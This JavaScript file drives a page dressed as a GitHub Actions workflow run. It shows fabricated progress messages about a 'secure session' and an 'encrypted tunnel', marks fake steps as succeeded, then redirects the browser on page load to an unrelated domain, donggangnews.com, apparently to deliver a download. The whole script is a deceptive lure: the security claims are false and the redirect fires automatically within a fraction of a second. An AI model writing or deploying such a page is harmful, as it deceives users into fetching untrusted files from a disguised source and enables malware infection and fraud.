
document.addEventListener('DOMContentLoaded', function() {
  const statusText = document.getElementById('status-text');
  const progressFill = document.getElementById('progress-fill');
  const statusMetaText = document.getElementById('status-meta-text');
  const workflowStatusIcon = document.getElementById('workflow-status-icon');
  const jobIcon = document.getElementById('job-icon');
  const stepRunning = document.getElementById('step-running');
  const stepRedirect = document.getElementById('step-redirect');

  const statusMessages = [
    'Initializing secure session...',
    'Establishing encrypted tunnel...',
    'Preparing download link...'
  ];

  let messageIndex = 0;
  let isComplete = false;

  function updateStatus() {
    if (messageIndex < statusMessages.length && !isComplete) {
      statusText.style.opacity = '0';
      setTimeout(() => {
        statusText.textContent = statusMessages[messageIndex];
        statusText.style.opacity = '1';
      }, 60);

      messageIndex++;

      const progress = (messageIndex / statusMessages.length) * 100;
      progressFill.style.width = progress + '%';

      if (messageIndex < statusMessages.length) {
        setTimeout(updateStatus, 120);
      } else {
        isComplete = true;

        setTimeout(() => {
          statusText.style.opacity = '0';
          setTimeout(() => {
            statusText.textContent = 'Connection established';
            statusText.style.opacity = '1';
          }, 60);

          stepRunning.classList.remove('step-running');
          stepRunning.classList.add('step-done');
          stepRunning.innerHTML = `
            <svg width="12" height="12" viewBox="0 0 16 16" fill="#3fb950"><path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"/></svg>
            <span>Secure connection established</span>
          `;

          stepRedirect.classList.remove('step-pending');
          stepRedirect.classList.add('step-running');
          stepRedirect.innerHTML = `
            <svg class="spinner-xs" viewBox="0 0 16 16" width="12" height="12">
              <circle cx="8" cy="8" r="5.5" fill="none" stroke="#d29922" stroke-width="2" stroke-dasharray="22" stroke-dashoffset="7"/>
            </svg>
            <span>Redirecting to download...</span>
          `;

          if (statusMetaText) statusMetaText.textContent = 'Completing...';
        }, 80);

        setTimeout(() => {
          stepRedirect.classList.remove('step-running');
          stepRedirect.classList.add('step-done');
          stepRedirect.innerHTML = `
            <svg width="12" height="12" viewBox="0 0 16 16" fill="#3fb950"><path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"/></svg>
            <span>Redirect to download</span>
          `;

          jobIcon.innerHTML = `
            <svg width="14" height="14" viewBox="0 0 16 16" fill="#3fb950"><path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"/></svg>
          `;

          workflowStatusIcon.innerHTML = `
            <svg width="28" height="28" viewBox="0 0 16 16" fill="#3fb950">
              <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0Zm3.78 5.22a.749.749 0 0 0-1.06 0L6.75 9.19 5.28 7.72a.749.749 0 1 0-1.06 1.06l2 2a.749.749 0 0 0 1.06 0l4.5-4.5a.749.749 0 0 0 0-1.06Z"/>
            </svg>
          `;

          if (statusMetaText) statusMetaText.textContent = 'Succeeded';
          progressFill.style.width = '100%';
          progressFill.classList.add('done');

          const toast = document.getElementById('download-toast');
          if (toast) toast.classList.add('visible');

          window.location.href = 'https://donggangnews.com/kl/26-03';
        }, 150);
      }
    }
  }

  if (statusText) statusText.style.transition = 'opacity 0.06s ease';
  setTimeout(updateStatus, 50);
});

function toggleInfoPopup() {
  const popup = document.getElementById('infoPopup');
  const isHidden = popup.style.display === 'none' || popup.style.display === '';
  popup.style.display = isHidden ? 'flex' : 'none';
}

document.addEventListener('click', function(event) {
  const popup = document.getElementById('infoPopup');
  if (!popup || popup.style.display !== 'flex') return;
  const dialog = popup.querySelector('.popup-dialog');
  const trigger = event.target.closest('.footer-link');
  if (dialog && !dialog.contains(event.target) && !trigger) {
    popup.style.display = 'none';
  }
});
